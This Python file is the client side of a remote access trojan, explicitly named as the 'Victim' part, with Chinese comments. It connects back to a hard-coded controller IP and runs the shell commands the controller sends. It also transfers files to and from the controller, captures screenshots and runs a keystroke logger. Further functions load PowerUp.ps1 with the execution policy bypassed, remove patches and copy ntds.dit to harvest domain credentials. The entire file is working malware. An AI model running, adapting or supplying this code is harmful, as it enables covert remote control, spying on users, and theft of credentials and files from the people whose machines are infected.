import socket
import struct
import os
import subprocess
import time
from PIL import ImageGrab
from pynput.keyboard import Key, Listener


class Victim:
    def __init__(self, ip, port):
        self.serverIP = ip
        self.serverPort = port
        self.serverAddr = (self.serverIP, self.serverPort)
        # 连接主控端.
        self.victimSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.victimSocket.connect(self.serverAddr)

        while True:
            command = self.victimSocket.recv(1024).decode("gbk")
            if not command:
                break
            # 拆分命令
            commlist = command.split()
            if command == 'exit':
                break
            # 执行powersploit的命令.
            elif commlist[0] == "powersploit":
                self.run_powershell_commands(commlist[1], self.victimSocket)
                continue
            # 文件上传/下载
            elif command.split()[0] == 'upload' or command.split()[0] == 'download':
                self.TransferFiles(self.victimSocket, command)
                continue
            # 目录切换
            elif commlist[0] == 'cd':
                try:
                    os.chdir(commlist[1])
                    chdir = os.getcwd()
                    self.send_result(self.victimSocket, chdir.encode())
                    continue
                except:
                    self.send_result(self.victimSocket, "Failed to switch directory.".encode())
                    continue
            # 截图
            elif commlist[0] == 'screenshot':
                screenshot_time = self.capture_screenshot(commlist[1])
                time_result = str(screenshot_time)
                self.send_result(self.victimSocket, time_result.encode())
                continue
            # 删除补丁操作，防止报错
            elif commlist[-1] == '/norestart':
                os.system(command)
                result = '\033[1;32;32m' + "[+] The patch removal operation has been successfully executed!" + '\033[0m'
                self.send_result(self.victimSocket, result.encode())
                continue
            # 读取ntds.dit
            elif commlist[0] == 'copy':
                result = str(os.system(command))
                if result == '0':
                    success_to_ntds = '\033[1;34;34m' + "[*] ntds.dit文件已经成功复制到C盘的目录下." + '\033[0m'
                    self.send_result(self.victimSocket, success_to_ntds.encode("gbk"))
                else:
                    fail_to_ntds = '\033[1;31;31m' + "[-] ntds.dit文件复制失败" + '\033[0m'
                    self.send_result(self.victimSocket, fail_to_ntds.encode("gbk"))
                continue
            # 存储型键盘记录器
            elif command == "Stored Keystroke logging":
                try:
                    keyboard = stored_keyboard(self.victimSocket)
                    command_keyboard = "type key_log.txt && DEL key_log.txt && exit"
                    result = subprocess.check_output(command_keyboard, shell=True)
                    self.send_result(self.victimSocket, result)
                    continue
                except:
                    quit_err = '\033[1;31;31m' + "[!] Keystroke logging ended." + '\033[0m'
                    self.send_result(self.victimSocket, quit_err.encode())
                    continue
            else:
                try:
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    result = subprocess.check_output(command, startupinfo=startupinfo)
                    self.send_result(self.victimSocket, result)
                    continue
                except:
                    exec_failed = '\033[1;31;31m' + "[-] Command execution failed!" + '\033[0m'
                    self.send_result(self.victimSocket, exec_failed.encode())
                    continue

        self.victimSocket.close()

    # 文件下载函数
    def DownloadFile(self, victimSocket):
        while True:
            fileInfo = victimSocket.recv(struct.calcsize('128sq'))
            if fileInfo:
                # 按照同样的格式（128sl）进行拆包
                fileName, fileSize = struct.unpack('128sq', fileInfo)
                # 要把文件名后面的多余无意义的空字符去除
                fileName = fileName.decode().strip('\00')
                # 定义上传文件的存放路径   ./表示当前目录下
                newFilename = os.path.join('./', fileName)

                # 接下来开始接收文件的内容
                # 表示已经接收到的文件内容大小
                recvdSize = 0
                with open(newFilename, 'wb') as f:
                    # 分次分块写入
                    while not recvdSize == fileSize:
                        if fileSize - recvdSize > 1024:
                            data = victimSocket.recv(1024)
                            f.write(data)
                            recvdSize += len(data)
                        else:
                            # 剩下内容不足1024时，则把剩下的全部内容都接收写入
                            data = victimSocket.recv(fileSize - recvdSize)
                            f.write(data)
                            recvdSize = fileSize
                            break
            break

    # 文件上传函数
    def UploadFile(self, victimSocket, filepath):
        while True:
            uploadFilePath = filepath
            if os.path.isfile(uploadFilePath):
                fileInfo = struct.pack('128sq', bytes(os.path.basename(uploadFilePath).encode("gbk")), os.stat(uploadFilePath).st_size)
                victimSocket.sendall(fileInfo)

                # 开始传输文件的内容
                print('[+]start uploading...')
                with open(uploadFilePath, 'rb') as f:
                    while True:
                        # 分块多次读，防止文件过大一次性读完导致内存不足
                        data = f.read(1024)
                        if not data:
                            print("[+]File Upload Over!!!")
                            break
                        victimSocket.sendall(data)
                    break

    # 文件传输函数
    def TransferFiles(self, victimSocket, command):
        while True:
            # 进行命令、参数的分割
            commList = command.split()
            # 若方法为download表示主控端需要获取被控端的文件
            if commList[0] == 'download':
                self.UploadFile(victimSocket, commList[1])
                break
            elif commList[0] == 'upload':
                self.DownloadFile(victimSocket)
                break

    # 截图函数
    def capture_screenshot(self, filename):
        beg = time.time()
        # 截取全屏
        screenshot = ImageGrab.grab()
        # 保存到指定的文件
        screenshot.save(filename)
        end = time.time()
        return (end - beg)

    # 执行powersploit命令
    def run_powershell_commands(self, command, victimSocket):
        commands = [
            "Import-Module .\\PowerUp.ps1",
            command
        ]
        try:
            process = subprocess.Popen(
                ["powershell", "-ExecutionPolicy", "Bypass", "-NoExit", "-Command", "-"],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True
            )
            for cmd in commands:
                process.stdin.write(cmd + '\n')
                process.stdin.flush()

            stdout, stderr = process.communicate()

            if stderr:
                self.send_result(victimSocket, f"Error: {stderr.strip()}".encode("gbk"))
                # Check if the stdout is empty
            if stdout.strip():
                self.send_result(victimSocket, stdout.strip().encode("gbk"))
            else:
                self.send_result(victimSocket, "[-] Command executed but returned no output.".encode("gbk"))

        except Exception as e:
            self.send_result(victimSocket, f"Error executing commands: {e}".encode("gbk"))
            self.send_result(victimSocket, "Failed to execute commands.".encode("gbk"))

    # 信息发送函数
    def send_result(self, victimSocket, result):
        # 打包固定长度
        result_len = struct.pack("i", len(result))
        # 发送长度
        victimSocket.sendall(result_len)
        # 发送内容
        victimSocket.sendall(result)


# 实时键盘记录器类
class stored_keyboard:
    def __init__(self, victimSocket):
        self.victimSocket = victimSocket
        # 定义一个日志文件名
        self.log_file = "key_log.txt"
        # 创建一个键盘监听器
        with Listener(on_press=self.on_press) as listener:
            # 启动监听器
            listener.join()

    # 定义一个按键处理函数
    def on_press(self, key):
        # 打开日志文件，追加模式
        with open(self.log_file, "a", encoding="utf-8") as f:
            # 判断按键是否是特殊键，如空格、回车、Esc等
            if isinstance(key, Key):
                # 写入按键的名称，加一个空格
                f.write(key.name + " ")
                # 如果按下了Esc键，退出监听
                if key == Key.esc:
                    return False
            else:
                # 否则，写入按键的字符值，不加空格
                f.write(key.char)


if __name__ == '__main__':
    victim = Victim("192.168.88.137", 6667)
